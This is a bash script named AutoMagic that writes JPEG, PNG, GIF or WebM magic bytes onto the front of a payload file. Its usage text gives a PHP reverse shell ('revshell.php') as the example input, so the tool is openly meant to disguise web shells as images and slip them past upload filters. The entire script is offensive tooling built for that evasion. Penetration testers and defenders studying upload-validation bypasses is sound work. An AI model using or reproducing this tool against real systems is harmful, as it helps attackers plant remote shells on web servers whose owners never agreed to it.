#!/bin/bash

function usage {
    echo "  AutoMagic is a simple shell script to change magic numbers of file to common image types."
    echo ""
    echo "  -p <payload>  payload to be edited."
    echo "  -f <format>   format to change payload to: jpg, png, gif or webm"
    echo "  -o <output>   output file of the edited payload"
    echo "  -h displays this message"
    echo ""
    echo "  example: $0 -p ~/Desktop/revshell.php -f png -o ~/Desktop/editedpayload"
    echo ""
    echo "  example: $0 -p ~/Desktop/revshell.php"
    echo " -f defaults to png format if empty or not provided."
    echo " -o defaults to inputfile.output.format if empty or not provided."
    echo ""
}

while getopts p:f:o:h option
do 
    case "${option}"
        in
        p)payload=${OPTARG};;
        f)format=${OPTARG};;
        o)output=${OPTARG};;
        h)usage;;
        ?)echo "Invalid option: -${OPTARG}."; exit 0;;
    esac
done

if [[ ${#} = 0 ]]; then
   usage
   exit 0
fi

if [ -e "$payload" ]
then
	:
else
	echo "file $payload does not exist."
	exit
fi

if [ "$format" = "" ]
then
	format="png"
	echo "no format provided, using: $format"
fi

tmpfile=/tmp/34760587636.txt
if [ "$output" == "" ]
then
	output=$(echo $payload | cut -f1 -d".")
	if [[ $payload =~ "/" ]]
	then

		touch $tmpfile
		echo $output | tr "/" '\n' > $tmpfile
		output=$(tail -n 1 $tmpfile)
		rm $tmpfile
	fi
	output="$output.output.$format"
	echo "no output name provided, using: $output"
fi

touch $output
touch $tmpfile

if [ "$format" = jpg ]
then
	echo 'AAAA' > $output
	cat $payload >> $output
	xxd $output | sed 's/4141 4141/FFD8 FFE0/' > $tmpfile
	xxd -r $tmpfile $output && rm $tmpfile

elif [ "$format" = png ]
then
	echo 'AAAAAAAA' > $output
	cat $payload >> $output
	xxd $output | sed 's/4141 4141 4141 4141/8950 4E47 0D0A 1A0A/' > $tmpfile
	xxd -r $tmpfile $output && rm $tmpfile

elif [ "$format" = gif ]
then
	echo 'AAAAAA' > $output
	cat $payload >> $output
	xxd $output | sed 's/4141 4141 4141/4749 4638 3961/' > $tmpfile
	xxd -r $tmpfile $output && rm $tmpfile

elif [ "$format" = webm ]
then
	echo 'AAAA' > $output
	cat $payload >> $output
	xxd $output | sed 's/4141 4141/1A45 DFA3/' > $tmpfile
	xxd -r $tmpfile $output && rm $tmpfile

else
	echo "Invalid format: $format"
	echo "Must be: jpg, png, gif or webm"

	if [ -e $tmpfile ]
	then
		rm $tmpfile
	else
		pass
	fi

	if [ -e $output ]
	then
		rm $output
	else
		pass
	fi

	exit 0
fi